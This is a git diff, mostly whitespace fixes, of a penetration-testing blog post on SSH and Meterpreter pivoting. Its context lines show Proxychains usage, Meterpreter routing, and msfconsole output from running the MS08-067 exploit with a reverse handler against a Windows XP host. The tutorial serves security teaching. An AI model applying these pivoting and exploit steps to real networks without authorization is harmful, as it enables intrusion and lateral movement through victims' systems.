@@ -3,8 +3,8 @@ layout: blog_item
 title:  "SSH & Meterpreter Pivoting Techniques"
 date:   2015-3-20 00:52:10
 author: Arr0way
-description: "SSH / Meterpreter Pivoting techniques for use during penetration testing, allowing an attacker to route traffic through a compromised host in order to gain access to another subnet." 
-categories: [Techniques] 
+description: "SSH / Meterpreter Pivoting techniques for use during penetration testing, allowing an attacker to route traffic through a compromised host in order to gain access to another subnet."
+categories: [techniques] 
 tags:
 - Metasploit
 - Meterpreter
@@ -13,15 +13,15 @@ tags:
 * list element with functor item
 {:toc}
 
-## WTF is Pivoting? 
+## WTF is Pivoting?
 
-**Pivoting** is a technique used to route traffic through a compromised host on a penetration test. 
+**Pivoting** is a technique used to route traffic through a compromised host on a penetration test.
 
-When conducting an external penetration test you may need to route traffic through a compromised machine in order to compromise internal targets. 
+When conducting an external penetration test you may need to route traffic through a compromised machine in order to compromise internal targets.
 
 **Pivoting**, allows you to leverage tools on your attacking machine while routing traffic through other hosts on the subnet, and potentially allowing access to other subnets.
 
-## SSH Pivoting Cheatsheet 
+## SSH Pivoting Cheatsheet
 
 ### SSH Port Forwarding
 
@@ -47,7 +47,7 @@ When conducting an external penetration test you may need to route traffic throu
 </div>
 
 
-### SSH Port Forwarding with Proxychains 
+### SSH Port Forwarding with Proxychains
 
 <div class="mobile-side-scroller">
 <table>
@@ -79,12 +79,12 @@ If you attempt to spawn a shell via Meterpreter, you'll get an error similar to 
 
 {% highlight bash %}
 meterpreter > execute -f cmd.exe -i -H
-|S-chain|-<>-127.0.0.1:9050-<><>-127.0.0.1:41713-<--timeout 
+|S-chain|-<>-127.0.0.1:9050-<><>-127.0.0.1:41713-<--timeout
 {% endhighlight %}
 
 ### Using Proxychain port forwards
 
-When using a Proxychain port forward, all commands need to be prefixed with the proxychain command, this instructs the application traffic to route through the proxy. 
+When using a Proxychain port forward, all commands need to be prefixed with the proxychain command, this instructs the application traffic to route through the proxy.
 
 <section class="shellbox">
     <div class="unit golden-large code">
@@ -103,10 +103,10 @@ When using a Proxychain port forward, all commands need to be prefixed with the 
 
 ## Configure Metasploit to use a SSH Pivot
 
-The following is an example of how to configure Metersploit to use a SSH portward. In this example port 9999 is forwarded to the target and the attacking machine has an IP address of 192.168.2.100: 
+The following is an example of how to configure Metersploit to use a SSH portward. In this example port 9999 is forwarded to the target and the attacking machine has an IP address of 192.168.2.100:
 
 {% highlight bash %}
-Setup the port forward (instructions above), then configure msfconsole as follows (using MS08_067 in this example). 
+Setup the port forward (instructions above), then configure msfconsole as follows (using MS08_067 in this example).
 
  msf exploit(ms08_067_netapi) > show options
 
@@ -135,7 +135,7 @@ Setup the port forward (instructions above), then configure msfconsole as follow
    0   Automatic Targeting
 {% endhighlight %}
 
-### Don't use 127.0.0.1 with Metasploit 
+### Don't use 127.0.0.1 with Metasploit
 
 <div class="note tip">
   <h5>Update: You can now use 127.0.0.2</h5>
@@ -150,7 +150,7 @@ The example above uses 0.0.0.0 **Not 127.0.0.1**, never use 127.0.0.1 with Metas
 {% highlight bash %}
  exploit(ms08_067_netapi) > exploit
 
- [*] Started reverse handler on 192.168.14.183:443 
+ [*] Started reverse handler on 192.168.14.183:443
  [*] Automatically detecting the target...
  [*] Fingerprint: Windows XP - Service Pack 3 - lang:English
  [*] Selected Target: Windows XP SP3 English (AlwaysOn NX)
@@ -248,7 +248,7 @@ Assuming you've compromised the target machine and have a meterpreter shell, you
             <p>Meterpreter add route for 192.168.14.0/24 via Session 3.</p>
       </td>
     </tr>
-    
+
     <tr>
       <td>
         <p><code>route delete 192.168.14.0 255.255.255.0 3</code></p>
@@ -278,7 +278,7 @@ Assuming you've compromised the target machine and have a meterpreter shell, you
   <p>Meterpreter port forwards can be a bit flakey, also the meterpreter session needs to be remain open.</p>
 </div>
 
-In order to connect to the compromised machine you would run: 
+In order to connect to the compromised machine you would run:
 
 <section class="shellbox">
     <div class="unit golden-large code">
@@ -299,17 +299,17 @@ Pivoting can be a bit hard to understand on paper, so here are some diagrams for
 
 ![Brace for Wonky Visio Arrows](https://i.imgur.com/UVoxUFl.png)
 
-### Starting Point 
+### Starting Point
 
-You'll need to have access to a compromised machine on the target network, depending on the compromised machines configuration you may or may not need root. 
+You'll need to have access to a compromised machine on the target network, depending on the compromised machines configuration you may or may not need root.
 
-![SSH Pivot Example 1: Starting Point](https://i.imgur.com/zRIqADW.png) 
+![SSH Pivot Example 1: Starting Point](https://i.imgur.com/zRIqADW.png)
 
 ### Routing Traffic to the Same Subnet
 
 ![Pivot Example 2: Routing traffic to the same subnet](https://i.imgur.com/TXV6ehn.png)
 
-####Example commands 
+####Example commands
 
 ##### SSH Pivoting using Proxychains
 
@@ -326,7 +326,7 @@ You'll need to have access to a compromised machine on the target network, depen
     </div>
 </section>
 
-You could then connect to Target 2's RDP server using: 
+You could then connect to Target 2's RDP server using:
 
 <section class="shellbox">
     <div class="unit golden-large code">
@@ -373,14 +373,14 @@ You could then connect to Target 2's RDP server using:
 
 ### SSH and Meterpreter Pivoting
 
-This example uses SSH pivoting and Meterpreter port forwarding to access machines on subnet 2. 
+This example uses SSH pivoting and Meterpreter port forwarding to access machines on subnet 2.
 
 ![Pivot Example 3: Using SSH and Meterpreter Pivoting to access another subnet](https://i.imgur.com/gyylQup.png)
 
 ####Example commands
 
-The above commands would be leveraged to reach **Target 2**, from **Target 2** to **Target 3**, meterpreter would be used. Follow the [meterpreter portwarding example](https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#meterpreter-pivoting-cheatsheet) above for a MS08-067 example. 
+The above commands would be leveraged to reach **Target 2**, from **Target 2** to **Target 3**, meterpreter would be used. Follow the [meterpreter portwarding example](https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#meterpreter-pivoting-cheatsheet) above for a MS08-067 example.
 
-If this was helpfull, click tweet below. 
+If this was helpfull, click tweet below.
 
 Enjoy.
